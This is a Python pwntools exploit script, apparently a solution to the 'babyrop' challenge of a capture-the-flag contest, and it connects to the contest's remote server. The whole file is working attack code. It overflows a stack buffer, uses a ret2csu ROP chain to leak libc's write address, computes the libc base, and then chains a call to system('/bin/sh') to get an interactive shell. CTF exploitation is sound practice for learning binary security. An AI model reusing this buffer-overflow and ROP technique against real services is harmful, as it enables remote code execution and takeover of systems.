from pwn import *

e = ELF("./babyrop")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = e
context.terminal = ["konsole", "-e"]

context.log_level="debug"


p = remote("dicec.tf", 31924)


poprdi = 0x00000000004011d3
csu1 = 0x00000000004011b0
csu2 = 0x00000000004011ca
ret = 0x000000000040101a

points_to_init = 0x4000f8


p.sendlineafter(":", "A"*72 + p64(poprdi) + p64(1) + p64(csu2) + p64(0) + p64(1)*2 + p64(e.got["write"]) + p64(8) + p64(points_to_init) + p64(csu1) + "AAAAAAAA"*7 + p64(e.plt["write"]) + p64(e.sym["main"]))



p.recv(1)

libc.address = u64(p.recv(8).ljust(8, "\x00")) - libc.sym["write"]

print("libc base", hex(libc.address))


p.sendlineafter(":", "A"*72 + p64(ret) + p64(poprdi) + p64(next(libc.search("/bin/sh"))) + p64(ret) + p64(libc.sym["system"]))


p.interactive()



